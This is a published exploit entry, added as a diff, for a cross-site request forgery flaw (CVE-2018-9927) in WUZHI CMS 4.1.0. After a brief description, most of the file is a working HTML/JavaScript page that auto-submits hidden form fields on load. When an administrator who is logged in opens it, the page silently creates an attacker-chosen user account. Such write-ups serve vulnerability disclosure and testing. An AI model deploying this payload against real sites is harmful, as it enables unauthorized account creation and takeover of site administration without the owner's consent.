@@ -1,0 +1,56 @@
+# Exploit Title: WUZHI CMS 4.1.0 CSRF vulnerability add user account
+# Date: 2018-04-10
+# Exploit Author: taoge
+# Vendor Homepage: https://github.com/wuzhicms/wuzhicms
+# Software Link: https://github.com/wuzhicms/wuzhicms
+# Version: 4.1.0 
+# CVE : CVE-2018-9927
+ 
+An issue was discovered in WUZHI CMS 4.1.0.（https://github.com/wuzhicms/wuzhicms/issues/128）
+There is a CSRF vulnerability that can add a user account via index.php?m=member&f=index&v=add.
+After the administrator logged in, open the csrf exp page.
+ 
+ 
+<html><body>
+<script type="text/javascript">
+function post(url,fields)
+{
+var p = document.createElement("form");
+p.action = url;
+p.innerHTML = fields;
+p.target = "_self";
+p.method = "post";
+document.body.appendChild(p);
+p.submit();
+}
+function csrf_hack()
+{
+var fields;
+
+
+fields += "<input type='hidden' name='info[username]' value='hack123' />";
+fields += "<input type='hidden' name='info[password]' value='hacktest' />";  
+fields += "<input type='hidden' name='info[pwdconfirm]' value='hacktest' />";  
+fields += "<input type='hidden' name='info[email]' value='taoge@5ecurity.cn' />";  
+fields += "<input type='hidden' name='info[mobile]' value='' />";  
+fields += "<input type='hidden' name='modelids[]' value='10' />";  
+fields += "<input type='hidden' name='info[groupid]' value='3' />";  
+fields += "<input type='hidden' name='pids[]' value='0' />";  
+fields += "<input type='hidden' name='pids[]' value='0' />";  
+fields += "<input type='hidden' name='pids[]' value='0' />"; 
+fields += "<input type='hidden' name='pids[]' value='0' />";  
+fields += "<input type='hidden' name='avatar' value='' />";  
+fields += "<input type='hidden' name='islock' value='0' />"; 
+fields += "<input type='hidden' name='sys_name' value='0' />"; 
+fields += "<input type='hidden' name='info[birthday]' value='' />";  
+fields += "<input type='hidden' name='info[truename]' value='' />";  
+fields += "<input type='hidden' name='info[sex]' value='0' />"; 
+fields += "<input type='hidden' name='info[marriage]' value='0' />"; 
+
+
+var url = "http://127.0.0.1/www/index.php?m=member&f=index&v=add&_su=wuzhicms&_menuid=30&_submenuid=74&submit=taoge";
+post(url,fields);
+}
+window.onload = function() { csrf_hack();}
+</script>
+</body></html>
